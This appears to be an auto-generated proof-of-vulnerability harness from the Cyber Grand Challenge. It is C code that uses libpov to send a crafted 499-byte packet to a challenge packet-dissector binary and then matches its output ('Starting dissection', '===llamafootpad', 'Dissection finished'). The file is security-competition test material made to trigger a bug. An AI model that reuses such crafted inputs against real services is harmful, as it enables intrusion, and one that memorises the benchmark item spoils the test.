#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xf3\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xdb\x01\x00\x00\xd3\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\xd3\x01\x00\x00"
         "\xaf\xf8\x15\x64\xd7\x39\x40\xf7\x8d\x3c\x8d\xd5\xd0\xca\x0a\x0b"
         "\x8d\xdc\x8d\xa7\x3c\x00\x00\x00\x1b\x05\x7c\x6d\x21\xb3\x4b\xb9"
         "\x01\x00\x94\x41\x00\x56\xe1\x3a\xfe\xcf\xa4\xe0\x28\x41\x00\xcf"
         "\x3c\x5a\x9d\x00\x56\xf9\xfb\x4e\xae\x1e\x9d\x01\x00\x31\xff\xff"
         "\x3e\x8b\xed\x95\x41\x00\x01\x00\x35\xbe\xb0\x67\x38\xdb\x34\xc4"
         "\x54\xb3\x07\x67\xbc\x44\x11\x70\x26\x87\x96\xe1\x2f\x2a\x12\xb3"
         "\x14\xdb\x2a\x01\xd1\xa1\xa8\x41\x00\x28\x37\x93\x3a\x31\x23\xe9"
         "\x11\x01\x00\xf1\xcd\xc3\xe1\x95\x41\x00\xff\xef\xbb\xf4\x13\x46"
         "\xe4\xc5\xc4\x75\xc5\x1d\x4a\x66\x62\x30\x0c\x06\xcb\x1d\x98\xa7"
         "\x91\x81\x10\x4c\xc4\xcf\x11\x65\x25\x72\x28\x24\x84\x83\x30\x99"
         "\xe0\x65\xcc\x3e\xb0\xce\x0c\xc9\x6d\xf2\xfa\xa4\xb7\x1e\x8e\xae"
         "\x3c\x1a\x78\x4e\x6b\x70\xd8\x82\x3c\xf2\xba\xd0\x33\xcd\xe1\x2a"
         "\x54\x1f\x08\x75\xb6\x12\x88\x74\xcb\xfe\x47\x58\xd4\x0c\x40\x72"
         "\x74\x31\x82\x97\xcd\x17\xa7\x3a\x0e\xcd\x4e\xe6\x4a\xf4\xe2\x90"
         "\x04\x88\x8d\x23\xe6\x70\x29\x7b\x0c\x36\x87\x41\x18\x16\xd4\xc3"
         "\x1d\x02\xb8\xf3\x5a\xc6\xbd\x3b\x54\x89\xb4\x45\xdc\x57\x07\x9c"
         "\xa8\x88\x30\x02\x4b\xa8\x9e\xc1\x42\x87\x4c\x5b\xa6\x5e\x16\x5b"
         "\x5d\xfa\x9f\x83\x77\xdf\xc4\x9e\x85\x88\x82\xb0\x04\x70\xa9\x8f"
         "\xcc\x3a\x35\x5b\xd1\xd6\x3b\xd0\xd9\x51\xda\xe7\xc1\x7e\x76\x15"
         "\x48\xfb\x64\x92\xb0\x40\x9b\x23\xbc\x9c\xeb\x7b\x5f\xee\x2f\xc4"
         "\x62\x45\xe6\x38\x2d\x18\xae\x95\x96\xb1\x33\xa9\x5e\x13\x16\xf7"
         "\x9c\xae\x08\xb5\x33\xa2\x1c\x76\x7f\xa7\x96\x93\x02\x09\x16\xd8"
         "\x2a\xb7\xf8\xae\xd3\x3f\x2d\xba\xa4\x1c\x25\x13\x74\xcc\x80\xfd"
         "\x22\x5f\x0e\xb9\xa1\xe3\xe6\x98\xe9\x93\x3c\xe9\xe0\xf1\x20\x0c"
         "\xba\x2c\xb0\xf5\xcb\x2f\x15\xda\x4c\xd8\xb0\x9b\x77\xbd\x5d\x0f"
         "\xb5\xbc\x01\x5a\x01\x00\x13\x01\x00\x0a\x89\x9c\xd9\x0b\xc6\x32"
         "\xc2\x59\x06\x5c\x98\x19\xd6\xfe\xb1\xe2\x01\x00\x18\x01\x30\xc0"
         "\x01\x00\xe9\x01\x2c\x01\x00\x84\x01\x20\xff\x41\x00\xdb\x3e\x2f"
         "\xed\xd0\xba\x8b\xe2\x89\x80\xa1\x55\xfc\xe8\x01\x25\x41\x00\xba"
         "\x0b\x25\xa0";
      static unsigned int write_00001_00000_len = 499;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamafootpad
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x66\x6f\x6f\x74\x70\x61"
         "\x64";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
